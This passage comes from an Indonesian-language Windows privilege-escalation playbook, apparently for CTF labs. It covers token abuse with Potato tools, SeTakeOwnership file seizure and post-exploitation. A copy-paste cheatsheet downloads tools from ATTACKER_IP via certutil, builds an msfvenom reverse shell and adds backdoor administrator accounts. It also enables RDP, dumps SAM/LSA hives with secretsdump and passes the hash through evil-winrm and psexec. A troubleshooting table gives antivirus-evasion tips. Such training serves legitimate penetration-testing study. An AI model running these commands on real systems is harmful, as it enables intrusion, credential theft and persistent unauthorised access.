➡️ Dengan domain admin hash → **Pass-the-Hash ke DC, golden ticket, dll.** → `<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`

---

## ═══════════════════════════════════════

## FASE 6: SETAKEOWNERSHIPPRIVILEGE

## ═══════════════════════════════════════

> **Masuk sini jika:** `SeTakeOwnershipPrivilege` ada. Berguna untuk akses file yang diprotect.

### Langkah 6.1 — File Ownership Abuse

cmd

```
REM Konfirmasi privilege
whoami /priv | findstr /i "SeTakeOwnershipPrivilege"

REM Ambil ownership file yang diprotect
takeown /f C:\Path\To\ProtectedFile.txt

REM Grant full control ke current user
icacls C:\Path\To\ProtectedFile.txt /grant %USERNAME%:F

REM Baca file
type C:\Path\To\ProtectedFile.txt
```

**OUTPUT BERHASIL ✅:**

text

```
SUCCESS: The file (or folder): "C:\Path\To\ProtectedFile.txt" now owned by user...
processed file: C:\Path\To\ProtectedFile.txt

(isi file muncul, mungkin berisi credentials atau flag)
```

**Skenario berguna di CTF:**

cmd

```
REM Akses SAM database langsung (jika file lock bisa diatasi)
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %USERNAME%:F

REM Copy dan analisis
copy C:\Windows\System32\config\SAM C:\Windows\Temp\SAM.bak
```

---

## ═══════════════════════════════════════

## FASE 7: POST-EXPLOITATION SETELAH SYSTEM

## ═══════════════════════════════════════

> **Masuk sini setelah `whoami` = `nt authority\system`**

### Langkah 7.1 — Verifikasi SYSTEM (WAJIB)

cmd

```
REM SELALU verifikasi dengan ini
whoami
whoami /all

REM Cek integrity level — harus System Mandatory Level
whoami /groups | findstr /i "Mandatory"
```

**OUTPUT BERHASIL ✅ — Konfirmasi SYSTEM:**

text

```
nt authority\system

Mandatory Label\System Mandatory Level    Label    S-1-16-16384
```

---

### Langkah 7.2 — Stabilkan Akses

cmd

```
REM Buat user admin backup (untuk persistent access)
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

REM Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

REM Enable WinRM (jika belum aktif)
powershell -c "Enable-PSRemoting -Force"
```

---

### Langkah 7.3 — Kumpulkan Credentials untuk Lateral Movement

cmd

```
REM Dump semua credential
reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y

REM Jika domain joined: jalankan secretsdump langsung dari Parrot
REM (setelah dapat admin credential)
```

Bash

```
# Di Parrot: dump langsung via network (lebih mudah)
impacket-secretsdump "Administrator:P@ssw0rd123!@$TARGET"
# atau dengan hash
impacket-secretsdump "Administrator@$TARGET" -hashes "LMHASH:NTHASH"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Dumping local SAM hashes
Administrator:500:...:fc525c9683e8fe067095ba2ddc971881:::
backdoor:1002:...:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Dumping cached domain logon information
CORP.LOCAL\domainadmin:$DCC2$10240#domainadmin#...

[*] Dumping LSA Secrets
_SC_MSSQLSERVER: svc_sql:SQLPass2024!
```

➡️ Setiap credential → test ke semua service → lateral movement → `<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`

---

### Langkah 7.4 — Ambil Flag

cmd

```
REM User flag
dir C:\Users\*\Desktop\*.txt 2>nul
for /D %u in (C:\Users\*) do type "%u\Desktop\user.txt" 2>nul

REM Root/Admin flag
dir C:\Users\Administrator\Desktop\
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\proof.txt

REM Flag tersembunyi
dir C:\*.txt 2>nul
```

---

### Langkah 7.5 — Recon untuk Pivoting (Jika Domain Environment)

cmd

```
REM Cek apakah domain joined
echo %USERDNSDOMAIN%

REM Jika domain environment:
ipconfig /all         REM Cari network lain
arp -a                REM Host di network yang sama
netstat -ano          REM Koneksi aktif
net view /domain      REM List domain computers

REM Jalankan SharpHound untuk BloodHound
certutil -urlcache -split -f http://ATTACKER_IP:8080/SharpHound.exe C:\Windows\Temp\SH.exe
C:\Windows\Temp\SH.exe -c All --zipfilename bh_data
```

➡️ Transfer BloodHound data → import ke BloodHound → `<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

text

```
START: Dapat shell Windows (service account / low-priv)
│
├─ FASE 0: Identifikasi Token
│   whoami /priv → apa yang ada?
│   │
│   ├─ SeImpersonatePrivilege → FASE 1 → FASE 2 (Potato)
│   ├─ SeAssignPrimaryTokenPrivilege → FASE 1 → FASE 2 (Potato)
│   ├─ SeDebugPrivilege → FASE 4 (LSASS Dump / Process Abuse)
│   ├─ SeBackupPrivilege → FASE 5 (SAM/NTDS Dump)
│   ├─ SeRestorePrivilege → FASE 5
│   ├─ SeTakeOwnershipPrivilege → FASE 6 (File Ownership)
│   └─ Tidak ada → File 45 (Windows PrivEsc General)
│
├─ FASE 1: OS Check
│   Build < 17763 (pra-1809)  → JuicyPotato viable
│   Build ≥ 17763 (1809+)     → GodPotato / PrintSpoofer
│   Tidak yakin               → Coba GodPotato dulu
│
├─ FASE 2: Potato Family (untuk SeImpersonate)
│   PATH A: GodPotato (modern Windows, default pilihan)
│   │   └─ [✅] SYSTEM → FASE 7
│   │   └─ [❌] → PATH B
│   PATH B: PrintSpoofer (Win10 / Server 2016-2019)
│   │   Prerequisite: Spooler service running
│   │   └─ [✅] SYSTEM → FASE 7
│   │   └─ [❌] → PATH C
│   PATH C: JuicyPotato (Windows lama, sebelum 1809)
│   │   Butuh CLSID yang tepat
│   │   └─ [✅] SYSTEM → FASE 7
│   │   └─ [❌] Coba CLSID lain → PATH D
│   PATH D: RoguePotato (dengan socat redirect)
│   │   └─ [✅] SYSTEM → FASE 7
│   │   └─ [❌] → PATH E
│   PATH E: SweetPotato (multi-technique)
│       └─ [✅] SYSTEM → FASE 7
│       └─ [❌] → File 45
│
├─ FASE 3: Meterpreter Incognito
│   (jika sudah punya Meterpreter session)
│   list_tokens → impersonate SYSTEM → shell
│
├─ FASE 4: SeDebugPrivilege
│   LSASS dump → credentials → PTH / crack
│
├─ FASE 5: SeBackupPrivilege
│   SAM/SYSTEM/SECURITY dump (local)
│   atau NTDS.dit dump (jika DC)
│   → crack offline → admin access
│
├─ FASE 6: SeTakeOwnershipPrivilege
│   takeown + icacls → akses file protected
│
└─ FASE 7: Post-Exploitation
    Verify SYSTEM → stabilize → dump creds →
    Ambil flag → pivot ke target lain
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`Access is denied` saat jalankan tool|AV, AppLocker, atau path issue|Pindah ke `C:\Windows\Temp`, cek AV dengan `Get-MpComputerStatus`|
|Tool langsung dihapus oleh AV|Windows Defender / AV|Pack dengan UPX, encode dengan msfvenom, atau buat custom binary|
|`GodPotato: Token Impersonation failed`|OS tidak cocok atau .NET version salah|Coba versi .NET lain (NET2, NET35, NET4)|
|`GodPotato: Unhandled Exception`|.NET runtime tidak tersedia|Cek `dir C:\Windows\Microsoft.NET\Framework\`, pilih build yang ada|
|`PrintSpoofer: CreateFile failed: 2`|Print Spooler service stopped|`sc start spooler`, jika gagal coba PrintSpoofer alternatif|
|`JuicyPotato: authresult -1`|CLSID tidak cocok dengan OS/build|Cari CLSID yang tepat di GitHub juicy-potato database|
|`JuicyPotato no output`|Windows 10 1809+ / Server 2019+|Benar-benar tidak work, gunakan GodPotato|
|`certutil download failed`|Firewall outbound atau permission|Coba PowerShell IWR, atau SMB server (`smbserver.py`)|
|Reverse shell tidak masuk|Firewall outbound blokir port|Coba port 80, 443, atau 8080. Test: `Test-NetConnection ATTACKER_IP -Port 4445`|
|`SeImpersonatePrivilege Disabled`|Privilege ada tapi inactive|Coba tetap jalankan Potato — tool akan mencoba enable|
|`SeImpersonatePrivilege` tidak ada|Benar-benar tidak punya privilege|Kembali ke File 45 (service exploit, registry, dll.)|
|`reg save` gagal (Access Denied)|Tidak punya SeBackupPrivilege|Privilege tidak ada, cari vector lain|
|`diskshadow` gagal|Bukan admin atau shadow copy error|Pastikan sudah elevated, cek log event viewer|
|`robocopy /b` tidak bisa copy NTDS|SeBackupPrivilege tidak aktif|Gunakan `reg save` method sebagai alternatif|
|Listener menerima koneksi tapi langsung putus|Shell tidak stable|Upgrade ke meterpreter atau gunakan `rlwrap nc`|
|`whoami` masih service account|Potato berhasil tapi spawn proses baru|Cek listener apakah koneksi masuk|
|`getsystem` gagal di Meterpreter|Privilege tidak cukup atau OS protection|Gunakan Potato manual|

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === PARROT SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4445"
python3 -m http.server 8080                    # Serve tools
rlwrap nc -lvnp $LPORT                         # Listener

# === PAYLOAD GENERATION ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
```

cmd

```
REM === TARGET: IDENTIFIKASI ===
whoami & whoami /priv & whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
echo %PROCESSOR_ARCHITECTURE%

REM === TRANSFER TOOLS ===
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/PrintSpoofer64.exe C:\Windows\Temp\PS.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/JuicyPotato.exe C:\Windows\Temp\JP.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/shell.exe C:\Windows\Temp\shell.exe

REM === GODPOTATO (Modern Windows - COBA PERTAMA) ===
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"                    REM Validate
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\shell.exe"        REM Shell
C:\Windows\Temp\gp.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add"

REM === PRINTSPOOFER (Win10/Server 2016-2019) ===
sc query spooler | findstr STATE                                 REM Cek Spooler
C:\Windows\Temp\PS.exe -i -c "cmd /c whoami"                   REM Validate
C:\Windows\Temp\PS.exe -c "C:\Windows\Temp\shell.exe"          REM Shell

REM === JUICYPOTATO (Windows Lama) ===
C:\Windows\Temp\JP.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\jp.txt" -t * -c {CLSID}
type C:\Windows\Temp\jp.txt

REM === SEBACKUP: SAM DUMP ===
reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y

REM === POST EXPLOIT ===
net user hacker P@ssw0rd123! /add
net localgroup administrators hacker /add
type C:\Users\Administrator\Desktop\root.txt
```

Bash

```
# === PARROT: POST-EXPLOITATION ===
impacket-secretsdump "Administrator:P@ssw0rd123!@$TARGET"       # Dump creds
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt     # Crack NTLM
evil-winrm -i $TARGET -u Administrator -H "NTHASH"              # PTH WinRM
impacket-psexec "Administrator@$TARGET" -hashes "LM:NT"         # PTH PsExec
```

---

## Cross-Service Token Flow

text

```
SYSTEM Shell Obtained
     │
     ├──→ Dump credentials (SAM/LSASS/LSA Secrets)
     │       └──→ Crack offline atau PTH
     │               ├─ ─→ SMB (port 445)        → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │               ├──→ WinRM (port 5985)      → evil-winrm
     │               ├─ ─→ RDP (port 3389)        → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
     │               └──→ Database (1433/3306)   → 14_database_workflow.md
     │
     ├─ ─→ Domain joined? → AD Enumeration        → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
     │       └─ ─→ BloodHound + NTDS dump         → <a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>
     │
     └─ ─→ Network recon → Pivoting               → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

> **➡️ NEXT STEPS setelah Token Impersonation:**
> 
> - Dapat domain creds/hashes → **`<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>`**
> - Lateral movement dengan hash → **`<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`**
> - Butuh persistence → **`<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>`**
> - Linux target berikutnya → **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`**
> - Sudo/SUID di Linux → **`<a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>`**